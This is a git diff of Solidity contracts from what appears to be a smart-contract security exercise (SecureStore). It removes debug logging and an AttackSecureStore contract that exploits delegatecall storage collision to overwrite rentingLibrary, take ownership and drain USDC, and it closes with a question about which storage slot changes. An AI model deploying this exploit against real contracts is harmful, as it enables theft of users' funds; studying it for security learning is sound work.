@@ -4,8 +4,6 @@ pragma solidity 0.8.24;
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
-import "hardhat/console.sol";
-
 contract SecureStore {
   address public rentingLibrary;
   address public owner;
@@ -58,19 +56,15 @@ contract SecureStore {
 
     // Override rentingLibrary with our malicious smart contract
     // Implement our "own" resntingLibrary that the function setCurrentRenter will write to the owner state variable
-
-    console.log("rentingLibrary: %s", rentingLibrary);
     (bool success, bytes memory data) = rentingLibrary.delegatecall(
       abi.encodePacked(setRenterIDFuncSig, _renterId)
     );
-    console.log("rentingLibrary2: %s", rentingLibrary);
     require(success, "Setting renter failed");
 
     emit RentedFor(_numDays);
   }
 
   function terminateRental() external onlyCurrentRenter {
-    console.log("terminateRental called:", rentingLibrary);
     uint256 remainingDays = (renters[msg.sender] - block.timestamp) / 1 days;
     require(remainingDays > 0, "No open rent");
 
@@ -93,68 +87,3 @@ contract SecureStore {
     usdc.safeTransfer(msg.sender, balanceOfContract);
   }
 }
-
-
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.24;
-
-import "hardhat/console.sol";
-
-contract RentingLibrary {
-  uint256 public currentRenter;
-
-  function setCurrentRenter(uint256 _renterId) public {
-    console.log("called setCurrentRenter in RentingLibrary");
-    currentRenter = _renterId;
-  }
-}
-
- // SPDX-License-Identifier: MIT
-pragma solidity 0.8.24;
-
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
-
-import "hardhat/console.sol";
-
-interface ISecureStore {
-  function rentWarehouse(uint256 _numDays, uint256 _renterId) external;
-  function terminateRental() external;
-}
-
-contract AttackSecureStore {
-  address public rentingLibrary;
-  address public owner;
-  uint256 public pricePerDay;
-  uint256 public rentedUntil;
-  ISecureStore public secureStore;
-
-  IERC20 public usdc;
-
-  using SafeERC20 for IERC20;
-
-  constructor(address _usdc, address _secureStore) {
-    usdc = IERC20(_usdc);
-    secureStore = ISecureStore(_secureStore);
-  }
-
-  function attack() external {
-    usdc.approve(address(secureStore), 100 ether);
-    // 20 bytes = 160bits
-    console.log("address(secureStore)", address(secureStore));
-    secureStore.rentWarehouse(1, uint256(uint160(address(secureStore))));
-    secureStore.terminateRental();
-    console.log("calling rentWarehouse again");
-    secureStore.rentWarehouse(1, uint256(uint160(tx.origin)));
-    secureStore.terminateRental();
-    usdc.transfer(tx.origin, 100 ether);
-  }
-
-  function setCurrentRenter(uint256 _renterId) public {
-    console.log("called setCurrentRenter in Attacker");
-    owner = address(uint160(_renterId));
-  }
-}
-
-
-If AttackSecureStore call SecureStore and SecureStore delegatecall RentingLibrary and RentingLibrary is modify slot 0 value. Which slot of which contract is modified?
